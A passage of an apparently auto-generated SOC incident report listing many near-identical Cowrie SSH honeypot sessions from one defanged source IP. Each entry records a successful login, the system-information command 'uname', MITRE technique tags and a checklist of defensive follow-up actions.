- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e6e89f54928

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:42` | `cowrie.session.connect` |
| `2026-08-15 06:55:42` | `cowrie.client.version` |
| `2026-08-15 06:55:42` | `cowrie.client.kex` |
| `2026-08-15 06:55:43` | `cowrie.login.success` |
| `2026-08-15 06:55:43` | `cowrie.session.params` |
| `2026-08-15 06:55:43` | `cowrie.command.input` |
| `2026-08-15 06:55:43` | `cowrie.log.closed` |
| `2026-08-15 06:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9072124059c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:48` | `cowrie.session.connect` |
| `2026-08-15 06:55:48` | `cowrie.client.version` |
| `2026-08-15 06:55:48` | `cowrie.client.kex` |
| `2026-08-15 06:55:49` | `cowrie.login.success` |
| `2026-08-15 06:55:50` | `cowrie.session.params` |
| `2026-08-15 06:55:50` | `cowrie.command.input` |
| `2026-08-15 06:55:50` | `cowrie.log.closed` |
| `2026-08-15 06:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d8c8f044a9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:55 |
| **Last Seen** | 2026-08-15 06:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:55:54` | `cowrie.session.connect` |
| `2026-08-15 06:55:54` | `cowrie.client.version` |
| `2026-08-15 06:55:54` | `cowrie.client.kex` |
| `2026-08-15 06:55:55` | `cowrie.login.success` |
| `2026-08-15 06:55:56` | `cowrie.session.params` |
| `2026-08-15 06:55:56` | `cowrie.command.input` |
| `2026-08-15 06:55:56` | `cowrie.log.closed` |
| `2026-08-15 06:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0030a851b5c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:00` | `cowrie.session.connect` |
| `2026-08-15 06:56:00` | `cowrie.client.version` |
| `2026-08-15 06:56:00` | `cowrie.client.kex` |
| `2026-08-15 06:56:01` | `cowrie.login.success` |
| `2026-08-15 06:56:02` | `cowrie.session.params` |
| `2026-08-15 06:56:02` | `cowrie.command.input` |
| `2026-08-15 06:56:02` | `cowrie.log.closed` |
| `2026-08-15 06:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798af5479af5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:06` | `cowrie.session.connect` |
| `2026-08-15 06:56:06` | `cowrie.client.version` |
| `2026-08-15 06:56:06` | `cowrie.client.kex` |
| `2026-08-15 06:56:07` | `cowrie.login.success` |
| `2026-08-15 06:56:08` | `cowrie.session.params` |
| `2026-08-15 06:56:08` | `cowrie.command.input` |
| `2026-08-15 06:56:09` | `cowrie.log.closed` |
| `2026-08-15 06:56:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30d9c0095d70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:11` | `cowrie.session.connect` |
| `2026-08-15 06:56:11` | `cowrie.client.version` |
| `2026-08-15 06:56:11` | `cowrie.client.kex` |
| `2026-08-15 06:56:11` | `cowrie.login.success` |
| `2026-08-15 06:56:12` | `cowrie.session.params` |
| `2026-08-15 06:56:12` | `cowrie.command.input` |
| `2026-08-15 06:56:12` | `cowrie.log.closed` |
| `2026-08-15 06:56:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-451201b2e919

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:16` | `cowrie.session.connect` |
| `2026-08-15 06:56:16` | `cowrie.client.version` |
| `2026-08-15 06:56:16` | `cowrie.client.kex` |
| `2026-08-15 06:56:17` | `cowrie.login.success` |
| `2026-08-15 06:56:18` | `cowrie.session.params` |
| `2026-08-15 06:56:18` | `cowrie.command.input` |
| `2026-08-15 06:56:18` | `cowrie.log.closed` |
| `2026-08-15 06:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-228f3bf81d24

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:22` | `cowrie.session.connect` |
| `2026-08-15 06:56:22` | `cowrie.client.version` |
| `2026-08-15 06:56:22` | `cowrie.client.kex` |
| `2026-08-15 06:56:23` | `cowrie.login.success` |
| `2026-08-15 06:56:24` | `cowrie.session.params` |
| `2026-08-15 06:56:24` | `cowrie.command.input` |
| `2026-08-15 06:56:24` | `cowrie.log.closed` |
| `2026-08-15 06:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc73c1c6ec0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:27` | `cowrie.session.connect` |
| `2026-08-15 06:56:27` | `cowrie.client.version` |
| `2026-08-15 06:56:27` | `cowrie.client.kex` |
| `2026-08-15 06:56:28` | `cowrie.login.success` |
| `2026-08-15 06:56:29` | `cowrie.session.params` |
| `2026-08-15 06:56:29` | `cowrie.command.input` |
| `2026-08-15 06:56:29` | `cowrie.log.closed` |
| `2026-08-15 06:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f086d8d2b67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:32` | `cowrie.session.connect` |
| `2026-08-15 06:56:32` | `cowrie.client.version` |
| `2026-08-15 06:56:32` | `cowrie.client.kex` |
| `2026-08-15 06:56:34` | `cowrie.login.success` |
| `2026-08-15 06:56:35` | `cowrie.session.params` |
| `2026-08-15 06:56:35` | `cowrie.command.input` |
| `2026-08-15 06:56:35` | `cowrie.log.closed` |
| `2026-08-15 06:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ac256a9aa5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:38` | `cowrie.session.connect` |
| `2026-08-15 06:56:38` | `cowrie.client.version` |
| `2026-08-15 06:56:38` | `cowrie.client.kex` |
| `2026-08-15 06:56:39` | `cowrie.login.success` |
| `2026-08-15 06:56:40` | `cowrie.session.params` |
| `2026-08-15 06:56:40` | `cowrie.command.input` |
| `2026-08-15 06:56:40` | `cowrie.log.closed` |
| `2026-08-15 06:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14dd93e936b2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:43` | `cowrie.session.connect` |
| `2026-08-15 06:56:43` | `cowrie.client.version` |
| `2026-08-15 06:56:43` | `cowrie.client.kex` |
| `2026-08-15 06:56:44` | `cowrie.login.success` |
| `2026-08-15 06:56:45` | `cowrie.session.params` |
| `2026-08-15 06:56:45` | `cowrie.command.input` |
| `2026-08-15 06:56:45` | `cowrie.log.closed` |
| `2026-08-15 06:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aec48afaa147

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:49` | `cowrie.session.connect` |
| `2026-08-15 06:56:49` | `cowrie.client.version` |
| `2026-08-15 06:56:49` | `cowrie.client.kex` |
| `2026-08-15 06:56:50` | `cowrie.login.success` |
| `2026-08-15 06:56:51` | `cowrie.session.params` |
| `2026-08-15 06:56:51` | `cowrie.command.input` |
| `2026-08-15 06:56:51` | `cowrie.log.closed` |
| `2026-08-15 06:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5f14cc09e52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:56 |
| **Last Seen** | 2026-08-15 06:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:56:54` | `cowrie.session.connect` |
| `2026-08-15 06:56:54` | `cowrie.client.version` |
| `2026-08-15 06:56:54` | `cowrie.client.kex` |
| `2026-08-15 06:56:55` | `cowrie.login.success` |
| `2026-08-15 06:56:56` | `cowrie.session.params` |
| `2026-08-15 06:56:56` | `cowrie.command.input` |
| `2026-08-15 06:56:56` | `cowrie.log.closed` |
| `2026-08-15 06:56:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acfdefccddb3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:00` | `cowrie.session.connect` |
| `2026-08-15 06:57:00` | `cowrie.client.version` |
| `2026-08-15 06:57:00` | `cowrie.client.kex` |
| `2026-08-15 06:57:00` | `cowrie.login.success` |
| `2026-08-15 06:57:01` | `cowrie.session.params` |
| `2026-08-15 06:57:01` | `cowrie.command.input` |
| `2026-08-15 06:57:01` | `cowrie.log.closed` |
| `2026-08-15 06:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8294ea00d8e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:05` | `cowrie.session.connect` |
| `2026-08-15 06:57:05` | `cowrie.client.version` |
| `2026-08-15 06:57:05` | `cowrie.client.kex` |
| `2026-08-15 06:57:06` | `cowrie.login.success` |
| `2026-08-15 06:57:07` | `cowrie.session.params` |
| `2026-08-15 06:57:07` | `cowrie.command.input` |
| `2026-08-15 06:57:07` | `cowrie.log.closed` |
| `2026-08-15 06:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d04b2be8ea1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:11` | `cowrie.session.connect` |
| `2026-08-15 06:57:11` | `cowrie.client.version` |
| `2026-08-15 06:57:11` | `cowrie.client.kex` |
| `2026-08-15 06:57:11` | `cowrie.login.success` |
| `2026-08-15 06:57:12` | `cowrie.session.params` |
| `2026-08-15 06:57:12` | `cowrie.command.input` |
| `2026-08-15 06:57:12` | `cowrie.log.closed` |
| `2026-08-15 06:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667f338fa4bf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:16` | `cowrie.session.connect` |
| `2026-08-15 06:57:16` | `cowrie.client.version` |
| `2026-08-15 06:57:16` | `cowrie.client.kex` |
| `2026-08-15 06:57:17` | `cowrie.login.success` |
| `2026-08-15 06:57:17` | `cowrie.session.params` |
| `2026-08-15 06:57:17` | `cowrie.command.input` |
| `2026-08-15 06:57:18` | `cowrie.log.closed` |
| `2026-08-15 06:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f60b692ad3a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:21` | `cowrie.session.connect` |
| `2026-08-15 06:57:21` | `cowrie.client.version` |
| `2026-08-15 06:57:21` | `cowrie.client.kex` |
| `2026-08-15 06:57:22` | `cowrie.login.success` |
| `2026-08-15 06:57:23` | `cowrie.session.params` |
| `2026-08-15 06:57:23` | `cowrie.command.input` |
| `2026-08-15 06:57:23` | `cowrie.log.closed` |
| `2026-08-15 06:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10801eb0c18e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:28` | `cowrie.session.connect` |
| `2026-08-15 06:57:28` | `cowrie.client.version` |
| `2026-08-15 06:57:28` | `cowrie.client.kex` |
| `2026-08-15 06:57:28` | `cowrie.login.success` |
| `2026-08-15 06:57:30` | `cowrie.session.params` |
| `2026-08-15 06:57:30` | `cowrie.command.input` |
| `2026-08-15 06:57:30` | `cowrie.log.closed` |
| `2026-08-15 06:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67511b58218e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:35` | `cowrie.session.connect` |
| `2026-08-15 06:57:35` | `cowrie.client.version` |
| `2026-08-15 06:57:35` | `cowrie.client.kex` |
| `2026-08-15 06:57:36` | `cowrie.login.success` |
| `2026-08-15 06:57:37` | `cowrie.session.params` |
| `2026-08-15 06:57:37` | `cowrie.command.input` |
| `2026-08-15 06:57:37` | `cowrie.log.closed` |
| `2026-08-15 06:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dd595e033db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:42` | `cowrie.session.connect` |
| `2026-08-15 06:57:42` | `cowrie.client.version` |
| `2026-08-15 06:57:42` | `cowrie.client.kex` |
| `2026-08-15 06:57:43` | `cowrie.login.success` |
| `2026-08-15 06:57:44` | `cowrie.session.params` |
| `2026-08-15 06:57:44` | `cowrie.command.input` |
| `2026-08-15 06:57:44` | `cowrie.log.closed` |
| `2026-08-15 06:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c369149f8964

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:48` | `cowrie.session.connect` |
| `2026-08-15 06:57:48` | `cowrie.client.version` |
| `2026-08-15 06:57:48` | `cowrie.client.kex` |
| `2026-08-15 06:57:49` | `cowrie.login.success` |
| `2026-08-15 06:57:50` | `cowrie.session.params` |
| `2026-08-15 06:57:50` | `cowrie.command.input` |
| `2026-08-15 06:57:50` | `cowrie.log.closed` |
| `2026-08-15 06:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd4b0af02cb3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:57 |
| **Last Seen** | 2026-08-15 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:57:54` | `cowrie.session.connect` |
| `2026-08-15 06:57:54` | `cowrie.client.version` |
| `2026-08-15 06:57:54` | `cowrie.client.kex` |
| `2026-08-15 06:57:54` | `cowrie.login.success` |
| `2026-08-15 06:57:55` | `cowrie.session.params` |
| `2026-08-15 06:57:55` | `cowrie.command.input` |
| `2026-08-15 06:57:56` | `cowrie.log.closed` |
| `2026-08-15 06:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13602c5e65c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:00` | `cowrie.session.connect` |
| `2026-08-15 06:58:00` | `cowrie.client.version` |
| `2026-08-15 06:58:01` | `cowrie.client.kex` |
| `2026-08-15 06:58:01` | `cowrie.login.success` |
| `2026-08-15 06:58:02` | `cowrie.session.params` |
| `2026-08-15 06:58:02` | `cowrie.command.input` |
| `2026-08-15 06:58:02` | `cowrie.log.closed` |
| `2026-08-15 06:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f87f72ca763

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:58 |
| **Last Seen** | 2026-08-15 06:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:58:06` | `cowrie.session.connect` |
| `2026-08-15 06:58:07` | `cowrie.client.version` |
| `2026-08-15 06:58:07` | `cowrie.client.kex` |
